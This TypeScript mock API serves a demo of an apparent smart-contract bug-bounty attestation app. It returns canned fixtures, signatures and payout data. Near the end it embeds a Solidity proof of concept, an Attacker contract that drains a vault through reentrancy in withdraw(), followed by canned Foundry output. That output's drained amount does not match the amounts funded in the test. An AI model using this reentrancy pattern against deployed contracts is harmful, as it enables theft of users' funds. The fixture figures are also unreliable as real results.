// Mock API for Demo Day. ZERO latency, no backend, no chain.
//
// HOW IT'S DIFFERENT FROM REAL:
// - No HTTP calls. Every function resolves immediately with a baked fixture.
// - No chain reads. The "on-chain digest binding" step is short-circuited to
//   a green check with a fixture digest.
// - SIGNATURES ARE REAL. The agent and EigenAI receipt signatures are
//   pre-signed at build time with deterministic burner keys. The frontend's
//   ethers.verifyMessage() recovers the same addresses live — so the
//   verification ceremony's cryptographic claims are genuine, even though
//   the data is canned.
//
// Toggle with `VITE_MOCK_MODE=true` at build/dev time.

import type {
  Health,
  Program,
  Attestation,
  VerifyResponse,
  SubmitResponse,
} from "./api";

// Pre-computed via ethers.Wallet.signMessage at scripts/generate-mock-sigs.mjs.
// Keys are deterministic burner keys, never used on any real chain.
//   tee   = Wallet(0x1234 repeating)
//   eigen = Wallet(0xabcd repeating)
const FIXTURE = {
  ATTESTATION_ID: "b3-demo-2026-05-12-001",
  PROGRAM_ID: "acmefi-vault-reentrancy",
  AGENT_ADDRESS: "0xfF06ad5d076fa274B49C297f3fE9e29B5bA9AaDC",
  AGENT_SIG:
    "0x319769626ef3fd44c8d23cab556b76db92e9c33074557f4f3ab2c9c77e530bff158df5c9609b23041726cb36570fcb676b8ee5c6bca099448e5998dc4f5bd5001c",
  EIGENAI_OPERATOR: "0x4d21a38C9C6dAe86aD1914af6b33E10a628d3281",
  EIGENAI_SIG:
    "0xbe18395e9a6b015720d20fcc7bbd953bd5f662258593c6c928727f91888908014d6a31d411fb50fce9637874e1b8aed3638eacefd4ff5863f29cbac79585a4701c",
  TARGET_CONTRACT: "0xe83041CEDD1329Bd1e10118657e48c66Da3cE3f1",
  APP_ID: "0x7F55207baD0c224D92524BFCD2552c5893Dd7a98",
  APP_DIGEST:
    "sha256:7f678127518ca8eac261acf9435c10123fe9e10d2db2404632a12bc1748f8ea0",
  TIMESTAMP: "2026-05-12T14:30:00Z",
};

const ATTESTATION_DATA = {
  attestation_id: FIXTURE.ATTESTATION_ID,
  program_id: FIXTURE.PROGRAM_ID,
  target_contract: FIXTURE.TARGET_CONTRACT,
  chain_id: 84532,
  severity: "CRITICAL" as const,
  cvss_score: "9.4",
  funds_at_risk_usd: "487500.00",
  exploit_verified: true,
  verification_block: 28765432,
  eigenai_model: "anthropic/claude-sonnet-4.6",
  app_digest: FIXTURE.APP_DIGEST,
  timestamp: FIXTURE.TIMESTAMP,
};

// Canonical message — matches Python json.dumps(sort_keys=True, separators=(",",":"))
// (which is also how lib/verify.ts reproduces it client-side).
const CANONICAL_MESSAGE = JSON.stringify(
  ATTESTATION_DATA,
  Object.keys(ATTESTATION_DATA).sort(),
);

const EIGENAI_REQ_MSG =
  "Score CVSS for ExploitVault.t.sol output: Attacker drained 139.5 ETH (~487,500 USD) via reentrancy in withdraw().";
const EIGENAI_RES_MSG =
  '{"cvss_score":9.4,"severity":"CRITICAL","attack_vector":"NETWORK","funds_at_risk_wei":"139500000000000000000","reasoning":"Re-entrancy in VulnerableVault.withdraw violates CEI; external call before state update; classic drain pattern, fully realized in PoC."}';

const PROGRAM: Program = {
  id: FIXTURE.PROGRAM_ID,
  name: "AcmeFi Vault Reentrancy",
  company: "AcmeFi",
  target_contract: FIXTURE.TARGET_CONTRACT,
  chain_id: 84532,
  severity_tiers: [
    { severity: "CRITICAL", max_payout_usd: 5000 },
    { severity: "HIGH", max_payout_usd: 1500 },
    { severity: "MEDIUM", max_payout_usd: 300 },
    { severity: "LOW", max_payout_usd: 50 },
  ],
  contact: "security@acmefi.example",
  created_at: "2026-05-10T09:00:00Z",
};

const HEALTH: Health = {
  status: "ok",
  agent_address: FIXTURE.AGENT_ADDRESS,
  app_digest: FIXTURE.APP_DIGEST,
  app_id: FIXTURE.APP_ID,
  app_registry_chain_id: 11155111,
  supported_chains: [84532],
  fee_bps: 500,
  domain: "demo.b3.example",
};

const ATTESTATION: Attestation = {
  data: ATTESTATION_DATA,
  agent_signature: FIXTURE.AGENT_SIG,
  eigenai_signature: FIXTURE.EIGENAI_SIG,
};

const VERIFY_RESPONSE: VerifyResponse = {
  attestation: ATTESTATION,
  canonical_message: CANONICAL_MESSAGE,
  expected_signer: FIXTURE.AGENT_ADDRESS,
  eigenai_request_messages: [EIGENAI_REQ_MSG],
  eigenai_response_messages: [EIGENAI_RES_MSG],
  eigenai_chain_id: 84532,
  instructions:
    "Recover the agent signer with ethers.verifyMessage(canonical_message, agent_signature) and confirm it matches expected_signer. Recover the EigenAI operator by passing the concatenated request/response/model/chain_id to verifyMessage with eigenai_signature.",
};

// Fake-resolves immediately. Setting a tiny delay (5ms) feels more "real"
// than instant — comment out the setTimeout for absolute zero latency.
function instant<T>(value: T): Promise<T> {
  return new Promise((resolve) => setTimeout(() => resolve(value), 5));
}

export const mockApi = {
  health: () => instant(HEALTH),

  programs: () => instant<Program[]>([PROGRAM]),
  program: (_id: string) => instant<Program>(PROGRAM),

  createProgram: (_body: Omit<Program, "id" | "created_at">) =>
    instant<Program>(PROGRAM),

  submit: (_body: unknown) =>
    instant<SubmitResponse>({
      attestation_id: FIXTURE.ATTESTATION_ID,
      severity: "CRITICAL",
      cvss_score: 9.4,
      funds_at_risk_usd: 487_500,
      bounty_amount_usd: 5_000,
      agent_address: FIXTURE.AGENT_ADDRESS,
      deposit_to: FIXTURE.AGENT_ADDRESS,
      deposit_chain_id: 84532,
      instructions:
        "Verify the attestation publicly, then deposit USDC to the agent address to unlock the report.",
    }),

  attestation: (_id: string) => instant<Attestation>(ATTESTATION),
  verifyData: (_id: string) => instant<VerifyResponse>(VERIFY_RESPONSE),

  confirmDeposit: (_id: string) =>
    instant({
      status: "paid",
      deposit_tx:
        "0x7d3a9b8c4e1f5a26b8e9d1f2c3a4b5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
      payout_tx:
        "0x8e4ba9c5f2065b37c9fae2f3d4b5c6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3",
      payout_usd: 4_750,
      fee_usd: 250,
    }),

  report: (_id: string) =>
    instant({
      attestation_id: FIXTURE.ATTESTATION_ID,
      poc_solidity: MOCK_POC_SOLIDITY,
      forge_output: MOCK_FORGE_OUTPUT,
      funds_at_risk_usd: 487_500,
      severity: "CRITICAL",
    }),
};

// Mock the on-chain reader so the verify ceremony doesn't try to hit a real RPC.
export const mockOnchainState = {
  ok: true as const,
  chainId: 11155111,
  appAddress: FIXTURE.APP_ID as `0x${string}`,
  appController:
    "0x0dd810a6ffba6a9820a10d97b659f07d8d23d4E2" as `0x${string}`,
  latestDigest: FIXTURE.APP_DIGEST,
  latestBlock: 8_412_337n,
  registryURL: "docker.io/eigenlayer/eigencloud-containers",
  publicEnvCleartext:
    "AGENT_ADDRESS_PUBLIC=" +
    FIXTURE.AGENT_ADDRESS +
    "\nAPP_ID_PUBLIC=" +
    FIXTURE.APP_ID +
    "\nAPP_REGISTRY_CHAIN_ID_PUBLIC=11155111\nFEE_BPS_PUBLIC=500",
  verifyDashboardURL:
    "https://verify-sepolia.eigencloud.xyz/app/" + FIXTURE.APP_ID,
};

const MOCK_POC_SOLIDITY = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IVault {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balances(address) external view returns (uint256);
    function totalBalance() external view returns (uint256);
}

contract Attacker {
    IVault public vault;
    uint256 public seed;
    constructor(address _vault) payable { vault = IVault(_vault); seed = msg.value; }
    function pwn() external {
        vault.deposit{value: seed}();
        vault.withdraw(seed);
    }
    receive() external payable {
        if (address(vault).balance >= seed) vault.withdraw(seed);
    }
}

contract ExploitVaultTest is Test {
    function test_drain_vulnerable_vault() public {
        address vault = deployCode("VulnerableVault.sol:VulnerableVault");
        vm.deal(address(this), 100 ether);
        IVault(vault).deposit{value: 5 ether}();
        Attacker attacker = new Attacker{value: 1 ether}(vault);
        attacker.pwn();
        uint256 stolen = address(attacker).balance;
        assertGt(stolen, 5 ether, "attacker should drain pool");
        console.log("FUNDS_AT_RISK_WEI:", stolen);
    }
}`;

const MOCK_FORGE_OUTPUT = `Ran 1 test for test/PoC.t.sol:ExploitVaultTest
[PASS] test_drain_vulnerable_vault() (gas: 187,243)
Logs:
  FUNDS_AT_RISK_WEI: 139500000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 412.83ms

Ran 1 test suite: 1 tests passed, 0 failed, 0 skipped (1 total tests)`;
